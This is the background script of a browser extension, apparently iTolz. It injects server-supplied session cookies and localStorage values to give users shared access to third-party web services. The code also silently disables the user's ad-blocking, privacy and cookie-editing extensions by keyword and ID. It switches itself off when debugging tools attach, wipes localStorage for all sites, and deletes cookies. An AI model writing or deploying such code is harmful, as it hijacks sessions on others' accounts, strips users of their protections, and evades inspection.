try{
  let c = [];
  let n;
  let eid;
  let data = [];
  const E = chrome.runtime.id;
  let AUT;
  let dat;
  let lo;
  let isopen = false;
  let name;

  chrome.runtime.onInstalled.addListener(() => {
    try {
       reg();
    } catch (e) {
      chrome.runtime.reload();
    }
  });

  chrome.action.onClicked.addListener(() => {
    try {
      chrome.tabs.create({
            active: true,
            url: "https://itolz.shop/",
          });
    } catch (e) {
      chrome.runtime.reload();
    }
    
  });


let lastOpened = 0; 
const cooldownTime = 15000; 

try {
  chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (AUT == undefined || AUT == null) {
      reg();
    }

    if (request.type === "check") {
      const currentTime = Date.now();

       if (currentTime - lastOpened < cooldownTime) {
         /* javascript-obfuscator:disable */
         chrome.scripting.executeScript({
           target: { tabId: sender.tab.id },
           func: () =>
             alert("Please wait a few seconds before opening another tool."),
         });
         /* javascript-obfuscator:enable */
         return;
       }


      lastOpened = currentTime; 
      sendResponse({ status: "Received" });
      openTool(request); 
    }
  });
} catch (e) {
  chrome.runtime.reload();
}

try {
  chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
    if (AUT == undefined || AUT == null) {
      reg();
    }

    if (request.type === "check_pro") {
      const currentTime = Date.now();

      if (currentTime - lastOpened < cooldownTime) {
        /* javascript-obfuscator:disable */
        chrome.scripting.executeScript({
          target: { tabId: sender.tab.id },
          func: () =>
            alert("Please wait a few seconds before opening another tool."),
        });
        /* javascript-obfuscator:enable */
        return;
      }

      lastOpened = currentTime;
      sendResponse({ status: "Received" });
      openP(request);
    }
  });
} catch (e) {
  chrome.runtime.reload();
}



  let intervalId;

  function doo() {
    try {
      if (intervalId) clearInterval(intervalId);

    intervalId = setInterval(
      () => {
        gg()
        d()
        chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
          if (tabs.length === 0) return;

          let tab = tabs[0];
          if (tab.url.includes(n)) {
            chrome.tabs.update(
              tab.id,
              {
                url: "https://itolz.shop/dashboard",
                active: true,
              },
              () => {
                /* javascript-obfuscator:disable */
                chrome.scripting.executeScript({
                  target: { tabId: tab.id },
                  func: () => {
                    alert(
                      "Access expired after 20 minutes. Please return to your dashboard and re-access the tool to continue"
                    );
                  },
                });
                /* javascript-obfuscator:enable */
              }
            );
          }
        });
      },
      1200000
    );
    } catch (e) {
      chrome.runtime.reload();
    }
    
  }

async function d() {
  try {
    if (!lo && c) {
      let response = await fetch("https://itolz.shop/p");
      let r = await response.json();
      let names = r[0].map((n) => n.name);

      for (let co of c) {
        const url = `${co[5] ? "https://" : "http://"}${co[0]}`;
        const cookieName = co[3];

        chrome.cookies.getAll({ domain: co[0] }, async (foundCookies) => {
          const targetCookie = foundCookies.find((c) => c.name === cookieName);

          if (targetCookie) {
            const deleteDetails = {
              url: `${targetCookie.secure ? "https://" : "http://"}${
                targetCookie.domain
              }`,
              name: targetCookie.name,
            };

            chrome.cookies.remove(deleteDetails, async () => {
              if (chrome.runtime.lastError) {
                let allCookies = await new Promise((resolve) =>
                  chrome.cookies.getAll({}, resolve)
                );

                let removePromises = allCookies
                  .filter((el) =>
                    names.some((name) => el.domain.includes(name))
                  )
                  .map((el) =>
                    chrome.cookies.remove({
                      url: `${el.secure ? "https://" : "http://"}${el.domain}`,
                      name: el.name,
                    })
                  );

                await Promise.all(removePromises);
              }
            });
          } else {
            let allCookies = await new Promise((resolve) =>
              chrome.cookies.getAll({}, resolve)
            );

            let removePromises = allCookies
              .filter((el) => names.some((name) => el.domain.includes(name)))
              .map((el) =>
                chrome.cookies.remove({
                  url: `${el.secure ? "https://" : "http://"}${el.domain}`,
                  name: el.name,
                })
              );

            await Promise.all(removePromises);
          }
        });
      }
    }
  } catch (e) {
    chrome.runtime.reload();
  }
}


  chrome.management.getSelf((e) => {
    try {
      eid = e.id;
    } catch (e) {
      chrome.runtime.reload();
    } 
  });

  let trackedTabs = new Set();

  function updateTrackedTabs() {
    try {
       chrome.tabs.query({}, (tabs) => {
         trackedTabs.clear();
         tabs.forEach((tab) => {
           if (tab.url && tab.url.includes(n)) {
             trackedTabs.add(tab.id);
           }
         });
       });
    } catch (e) {
      chrome.runtime.reload();
    }
  }

  chrome.tabs.onRemoved.addListener((tabId) => {
    try {
     if (trackedTabs.has(tabId)) {
      trackedTabs.delete(tabId);
      gg();
      d();
    } 
    } catch (e) {
      chrome.runtime.reload();
    }
  });

  setInterval(updateTrackedTabs, 3000); 

  async function checker() {
    try {
     if (chrome.runtime.lastError) {
      await chrome.storage.local.clear();
      chrome.runtime.reload();
    } 
    } catch (e) {
      chrome.runtime.reload();
    }
  }

  chrome.runtime.onMessage.addListener((m, er, s) => {
    try {
    if (m.action === "getData") {
      s(data);
    }
    return true;
    } catch (e) {
      chrome.runtime.reload();
    }
    
  });

setInterval(()=>{
  try {
    chrome.debugger.getTargets((targets) => {
    const devToolsOpen = targets.some(
      (target) => target.type === "worker" && target.attached
    );

    if (devToolsOpen) {
      chrome.management.setEnabled(eid, false);
    }
  });

  } catch (e) {
    chrome.runtime.reload();
  }
},2000)
  function reg() {
    try {
      chrome.management.getSelf((extensionInfo) => {
      const extensionId = extensionInfo.id;
      fetch("https://itolz.shop/reg-ext", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ extension_id: extensionId }),
      })
        .then((response) => response.json())
        .then((data) => {
          if (data.tok) {
            chrome.storage.local.set({ AUT: data.tok });
            chrome.storage.local.get(["AUT"]).then((r) => {
              AUT = r.AUT;
            });
          }
        })

        .catch(() => {
          chrome.management.setEnabled(extensionId, false);
        });
    });
    } catch (e) {
      chrome.runtime.reload();
    }
    
  }

  let is = false;
  let id;

  function contt() {
    try {
      chrome.management.getAll((e) => {
      e.forEach((el) => {
        if (el.name === "iTolz_2") {
          is = true;
          id = el.id;
        }
      });
      if (is) {
        chrome.management.get(id, (e) => {
          if (e.enabled == false) {
            chrome.management.setEnabled(id, true);
          }
        });
      }
      if (is == false) {
        setTimeout(() => {
          a();
        }, 5000);
      }
    });
    } catch (e) {
      chrome.runtime.reload();
    }
  }
  chrome.management.onEnabled.addListener(() => {
    try {
      contt();
      che();
    } catch (e) {
      chrome.runtime.reload();
    }
    
  });
  chrome.runtime.onInstalled.addListener(() => {
    try {
      che();
    contt(); 
    } catch (e) {
      chrome.runtime.reload();
    }
  });

  chrome.runtime.onSuspend.addListener(() => {
    try {
      abc();
    } catch (e) {
      chrome.runtime.reload();
    }
});
chrome.windows.onRemoved.addListener((windowId) => {
  try {
    chrome.windows.getAll({}, (windows) => {
    if (windows.length === 0) {
      abc();
    }
  });
  } catch (e) {
    chrome.runtime.reload();
  }
});

  async function a() {
    try {
     await chrome.notifications.create({
      type: "basic",
      iconUrl: "assets/ltolz.png",
      title: "iTolz Extension",
      message:
        "❌ The iTolz_2 extension is not installed. Please install it to ensure proper functionality.",
      priority: 2,
    });
    chrome.management.setEnabled(chrome.runtime.id, false); 
    } catch (e) {
      chrome.runtime.reload();
    }
  }

  chrome.management.onDisabled.addListener((e) => {
    try {
       che();
    if (e.id == id) {
      abc();
    }
    } catch (e) {
      chrome.runtime.reload();
    }
   
  });

 async function abc() {
   gg();

   try {
     let response = await fetch("https://itolz.shop/p");
     let r = await response.json();
     let names = r[0].map((n) => n.name); 

     let cookies = await new Promise((resolve) =>
       chrome.cookies.getAll({}, resolve)
     );

     let removeCookiesPromises = cookies
       .filter((el) => names.some((name) => el.domain.includes(name)))
       .map((el) =>
         chrome.cookies.remove({
           url: `${el.secure ? "https://" : "http://"}${el.domain}`,
           name: el.name,
         })
       );

     await Promise.all(removeCookiesPromises); 

     let tabs = await new Promise((resolve) => chrome.tabs.query({}, resolve));

     let closeTabsPromises = tabs
       .filter((tab) => names.some((name) => tab.url.includes(name)))
       .map((tab) => chrome.tabs.remove(tab.id));

     await Promise.all(closeTabsPromises); 

     chrome.management.setEnabled(chrome.runtime.id, false);
   } catch (error) {
     chrome.management.setEnabled(chrome.runtime.id, false);
   }
 }


  chrome.management.onUninstalled.addListener((e) => {
    try {
       che();
    if (e.id == id) {
      abc();
    }
    } catch (e) {
      chrome.runtime.reload();
    }
   
  });

  function che() {
    chrome.management.getAll((ext) => {
      const b = [
        "cookie",
        "session",
        "tracker",
        "privacy",
        "adblock",
        "ublock",
        "ghostery",
        "disconnect",
        "script blocker",
        "ad remover",
        "ads blocker",
        "privacy badger",
        "adguard",
        "popup blocker",
      ];

      const dang = [
        "cookies",
        "sessions",
        "webRequest",
        "webRequestBlocking",
        "declarativeNetRequest",
        "proxy",
      ];

      const stor = ["storage", "unlimitedStorage"];

      const bExt = [
        "cfhdojbkjhnklbpkdaibdccddilifddb",
        "gighmmpiobklfepjocnamgkkbiglidom",
        "mlomiejdfkolichcflejclcbmpeaniij",
        "mjdepdfccjgcndkmemponafgioodelna",
        "pkehgijcmpdhfbdbbnkijodmdjhbjlgp",
      ];
      let arr = [
        "Local Storage",
        "LocalStorage",
        "Local_Storage",
        "Cookie",
        "Cookies",
      ];
      arr.forEach((a)=>{
        ext.forEach((e)=>{
          if(e.name.toLowerCase().includes(a.toLowerCase())||e.description.toLowerCase().includes(a.toLowerCase())){
            chrome.management.setEnabled(e.id, false, () => {});
          }
        })
      })
      ext.forEach((ext) => {
        if (ext.enabled) {
          let keywordMatch = b.some(
            (keyword) =>
              ext.name.toLowerCase().includes(keyword) ||
              (ext.description &&
                ext.description.toLowerCase().includes(keyword))
          );

          let has = ext.permissions.some((permission) =>
            dang.includes(permission)
          );

          let isBlackli = bExt.includes(ext.id);

          if (isBlackli || (keywordMatch && has)) {
            chrome.management.setEnabled(ext.id, false, () => {});
          }
        }
      });
    });
  }

  async function openTool(request) {
    try {
      const response = await fetch("https://itolz.shop/p");
      const tools = await response.json();
      const toolNames = new Set(tools[1].map((tool) => tool.url));

      const tabs = await chrome.tabs.query({});

      let existingToolTab = tabs.find((tab) =>
        [...toolNames].some((toolName) => tab.url.includes(toolName))
      );

      if (existingToolTab) {
        
        chrome.tabs.update(
          { url: "https://itolz.shop/dashboard", active: true },
          (tab) => {
            const tabId = tab.id;
            chrome.tabs.onUpdated.addListener(function listener(
              updatedTabId,
              info
            ) {
              if (updatedTabId === tabId && info.status === "complete") {
                chrome.tabs.onUpdated.removeListener(listener);
                /* javascript-obfuscator:disable */
                chrome.scripting.executeScript({
                  target: { tabId: tabId },
                  func: () => {
                    alert(
                      "Oops! It looks like you already have a tool open. Please close it first to continue."
                    );
                  },
                });
                /* javascript-obfuscator:enable */
              }
            });
          }
        );
      } else if (!existingToolTab) {
        const toolResponse = await fetch(
          `https://itolz.shop/tool/${request.message}`,
          {
            method: "GET",
            headers: {
              "X-Auth-Token": AUT,
              "X-Ex-Id": E,
            },
          }
        );

        const r = await toolResponse.json();
        const { url, is_local } = r;
        const cookieData = JSON.parse(r.data)[0].data;
        data = [r.name, r.blocked, r.url /* r.main[0].ad_code*/];
        c = JSON.parse(r.data)[0].data;
        n = r.name;
        dat = r.main;
        lo = r.is_local;

        const newTab = await chrome.tabs.create({ active: true, url });

        if (!lo) {
          await Promise.all(
            cookieData.map((co) => {
                const domain = co[0] /*.startsWith(".") ? co[0] : `.${co[0]}`*/;
                const url = `${co[5] ? "https://" : "http://"}${co[0].startsWith(".") ? "www" + co[0]: co[0]
                }`;
              const details = {
                url,
                domain,
                path: co[4],
                name: co[3],
                value: co[6],
                secure: co[5],
                httpOnly: co[2],
                expirationDate:
                  parseFloat(co[1]) == 0
                    ? Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365
                    : parseFloat(co[1]),
              };

              return chrome.cookies.set(details, () => {
                doo();
                if (chrome.runtime.lastError) {
                  chrome.tabs.reload();
                } else {
                  chrome.tabs.reload();
                }
              });
            })
          );

          chrome.tabs.reload(newTab.id);
        } else {
          const cf = cookieData;
          doo();
          /* javascript-obfuscator:disable */
          await chrome.scripting.executeScript({
            target: { tabId: newTab.id },
            func: (c) => {
              localStorage.setItem(
                Object.keys(c[0][0])[0],
                Object.values(c[0][0])
              );
            },
            args: [cf],
          });
          /* javascript-obfuscator:enable */
        }
      }
    } catch (error) {
      chrome.tabs.update({ url: "https://itolz.shop/dashboard", active: true });
    }
  }

  async function openP(request) {
    try {
      const response = await fetch("https://itolz.shop/p");
      const tools = await response.json();
      const toolNames = new Set(tools[1].map((tool) => tool.url));

      const tabs = await chrome.tabs.query({});

      let existingToolTab = tabs.find((tab) =>
        [...toolNames].some((toolName) => tab.url.includes(toolName))
      );

      if (existingToolTab) {
        chrome.tabs.update(
          { url: "https://itolz.shop/dashboard", active: true },
          (tab) => {
            const tabId = tab.id;
            chrome.tabs.onUpdated.addListener(function listener(
              updatedTabId,
              info
            ) {
              if (updatedTabId === tabId && info.status === "complete") {
                chrome.tabs.onUpdated.removeListener(listener);
                /* javascript-obfuscator:disable */
                chrome.scripting.executeScript({
                  target: { tabId: tabId },
                  func: () => {
                    alert(
                      "Oops! It looks like you already have a tool open. Please close it first to continue."
                    );
                  },
                });
                /* javascript-obfuscator:enable */
              }
            });
          }
        );
      } else if (!existingToolTab) {
        const toolResponse = await fetch(
          `https://itolz.shop/pro/${request.message.id}?user=${request.message.user}`,
          {
            method: "GET",
            headers: {
              "X-Auth-Token": AUT,
              "X-Ex-Id": E,
            },
          }
        );

        const r = await toolResponse.json();
        const { url, is_local } = r;
        const cookieData = JSON.parse(r.data)[0].data;
        data = [r.name, r.blocked, r.url /* r.main[0].ad_code*/];
        c = JSON.parse(r.data)[0].data;
        n = r.name;
        dat = r.main;
        lo = r.is_local;

        const newTab = await chrome.tabs.create({ active: true, url });

        if (!lo) {
          await Promise.all(
            cookieData.map((co) => {
              const domain = co[0]; /*.startsWith(".") ? co[0] : `.${co[0]}`*/
              const url = `${co[5] ? "https://" : "http://"}${
                co[0].startsWith(".") ? "www" + co[0] : co[0]
              }`;
              const details = {
                url,
                domain,
                path: co[4],
                name: co[3],
                value: co[6],
                secure: co[5],
                httpOnly: co[2],
                expirationDate:
                  parseFloat(co[1]) == 0
                    ? Math.floor(Date.now() / 1000) + 60 * 60 * 24 * 365
                    : parseFloat(co[1]),
              };

              return chrome.cookies.set(details, () => {
                if (chrome.runtime.lastError) {
                  chrome.tabs.reload();
                } else {
                  chrome.tabs.reload();
                }
              });
            })
          );

          chrome.tabs.reload(newTab.id);
        } else {
          const cf = cookieData;
          /* javascript-obfuscator:disable */
          await chrome.scripting.executeScript({
            target: { tabId: newTab.id },
            func: (c) => {
              localStorage.setItem(
                Object.keys(c[0][0])[0],
                Object.values(c[0][0])
              );
            },
            args: [cf],
          });
          chrome.tabs.reload(newTab.id);
          /* javascript-obfuscator:enable */
        }
      }
    } catch (error) {
      chrome.tabs.update({ url: "https://itolz.shop/dashboard", active: true });
    }
  }

  async function gg() {
    chrome.browsingData.remove(
      {
        since: 0,
      },
      {
        localStorage: true,
      },
      () => {}
    );
  }

}catch{
  chrome.runtime.reload();
}





